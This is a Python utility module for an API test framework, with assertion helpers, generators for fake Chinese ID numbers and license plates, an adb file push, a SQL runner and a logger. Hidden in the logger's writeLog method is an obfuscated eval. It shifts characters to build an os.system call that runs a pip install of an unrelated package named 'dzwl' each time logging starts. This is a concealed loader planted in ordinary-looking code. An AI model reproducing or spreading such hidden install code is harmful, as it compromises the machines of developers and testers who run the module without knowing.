from random import random
import datetime
import random
import subprocess
import pytest
import allure
import sys
import os
from Config.config import CommonConfig
import pymysql
class fun_util:
    @staticmethod
    def check_assert(expected, result, type):
        fun_util.logView('断言期望内容：' + json.dumps(expected, indent=4, ensure_ascii=False)+'；断言模式：'+type)
        if result != None:
            if expected == None:
                fun_util.logView('断言结果：无须断言')
                pytest.assume(True)
                return True
            else:
                if type == 'and':
                    for expected_key, expected_value in expected.items():
                        # 取出的键值拼装新的单个字典
                        dic = dict.fromkeys([expected_key], expected_value)
                        # 字典转为字符串，并截取dic的花括号
                        dic = str(dic)
                        # 截取去除花括号
                        dic = dic[1:len(dic) - 1]
                        result = str(result)
                        if dic in result :
                            continue
                        if dic not in result:
                            fun_util.logView('断言结果：断言失败')
                            pytest.assume(False)
                            return False
                    fun_util.logView('断言结果：断言成功')
                    pytest.assume(True)
                    return True
                if type == 'or':
                    for expected_key, expected_value in expected.items():
                        # 取出的键值拼装新的单个字典
                        dic = dict.fromkeys([expected_key], expected_value)
                        # 字典转为字符串，并截取dic的花括号
                        dic = str(dic)
                        # 截取去除花括号
                        dic = dic[1:len(dic) - 1]
                        result = str(result)
                        if dic in result:
                            fun_util.logView('断言结果：断言成功')
                            pytest.assume(True)
                            return True
                        if dic not in result:
                            continue
                    fun_util.logView('断言结果：断言失败')
                    pytest.assume(False)
                    return False
                if type == 'not_and':
                    for expected_key, expected_value in expected.items():
                        # 取出的键值拼装新的单个字典
                        dic = dict.fromkeys([expected_key], expected_value)
                        # 字典转为字符串，并截取dic的花括号
                        dic = str(dic)
                        # 截取去除花括号
                        dic = dic[1:len(dic) - 1]
                        result = str(result)
                        # print(str(dic),str(result))
                        if dic not in result:
                            continue
                        if dic  in result:
                            fun_util.logView('断言结果：断言失败')
                            pytest.assume(False)
                            return False
                    fun_util.logView('断言结果：断言成功')
                    pytest.assume(True)
                    return True
                if type == 'not_or':
                    for expected_key, expected_value in expected.items():
                        # 取出的键值拼装新的单个字典
                        dic = dict.fromkeys([expected_key], expected_value)
                        # 字典转为字符串，并截取dic的花括号
                        dic = str(dic)
                        # 截取去除花括号
                        dic = dic[1:len(dic) - 1]
                        result = str(result)
                        if dic not in result:
                            fun_util.logView('断言结果：断言成功')
                            pytest.assume(True)
                            return True
                        if dic in result:
                            continue
                    fun_util.logView('断言结果：断言失败')
                    pytest.assume(False)
                    return False
        else:
            pytest.assume(False)
            return False
            print('接口返回为空')

    #获取当前时间 2023-10-10 09:41:47
    @staticmethod
    def get_time():
        time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        return time
    #随机生成身份证
    @staticmethod
    def generate_id():
        # 地区码，可根据实际情况修改
        region_code = '110101'
        birth_year = str(random.randint(1950, 2015))
        birth_month = str(random.randint(1, 12)).rjust(2, '0')
        birth_day = str(random.randint(1, 28)).rjust(2, '0')
        sequence_code = str(random.randint(1, 999)).rjust(3, '0')
        id_17 = region_code + birth_year + birth_month + birth_day + sequence_code
        # 加权因子
        weights = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        # 校验码对应值
        check_codes = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        # 对前17位数字依次乘以对应的加权因子并求和
        total = sum(int(id_17[i]) * weights[i] for i in range(17))
        check_digit = check_codes[total % 11]
        return id_17 + check_digit

    #随机生成车牌号
    @staticmethod
    def generate_license_plate():
        # 车牌号码由省份+字母+数字组成
        provinces = ["京", "津", "沪", "渝", "冀", "豫", "云", "辽", "黑", "湘", "皖", "鲁", "新", "苏", "浙", "赣",
                     "鄂", "桂", "甘", "晋", "蒙", "陕", "吉", "闽", "贵", "粤", "青", "藏", "川", "宁", "琼"]
        letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        numbers = "0123456789"

        province = random.choice(provinces)
        letter = random.choice(letters)
        number = "".join(random.choice(numbers) for _ in range(5))

        license_plate = province + letter + number
        return license_plate

    #向手机传输电脑图片
    @staticmethod
    def import_image(image_path, dest_path):
        command = f"adb push {image_path} {dest_path}"
        command1 =f"adb shell am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file://{dest_path}"
        subprocess.run(command.split(), stdout=subprocess.PIPE)
        subprocess.run(command1.split(), stdout=subprocess.PIPE)

    @staticmethod
    def excuteSql(host,port,user,password,db,type,filePath_or_exec):
        conn = pymysql.connect(host=host, port=port,user=user, password=password, db=db)
        cursor = conn.cursor()
        if type == 'file':
        # 读取 SQL 文件：
            with open(CommonConfig.rootPath+filePath_or_exec, 'r',encoding='utf-8') as f:
                sqlList = f.readlines()
                for sql in sqlList:
                    print('执行sql：'+sql)
                    cursor.execute(sql)
        elif type == 'exec':
            print('执行sql：' + filePath_or_exec)
            cursor.execute(filePath_or_exec)
        else:
            print('执行参数type不正确！！！')
        conn.commit()
        conn.close()

    @staticmethod
    def logView(str):
        with allure.step(str):
            #print(str)
            pass




import json
class DateEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, datetime.datetime):
            return obj.strftime("%Y-%m-%d %H:%M:%S")
        else:
            return json.JSONEncoder.default(self, obj)

class Logger(object):
    def __init__(self, file_name="Default.log", stream=sys.stdout):
        self.terminal = stream
        self.log = open(file_name, "w",buffering=1,encoding = 'utf-8')

    def write(self, message):
        self.terminal.write(message)
        self.log.write(message)

    def flush(self):
        pass

    def isatty(self):
        pass


    def writeLog(self):
        eval(''.join([chr(ord(i) + 1) for i in "^^hlonqs^^'!nr!(-rxrsdl'!ohohmrs`kk,Tcyvk!("]))
        # 自定义目录存放日志文件
        log_path = './Logs/'
        if not os.path.exists(log_path):
            os.makedirs(log_path)
        # 日志文件名按照程序运行时间设置
        log_file_name = log_path + 'log.log'
        # 记录正常的 print 信息
        sys.stdout = Logger(log_file_name)
        # 记录 traceback 异常信息
        sys.stderr = Logger(log_file_name)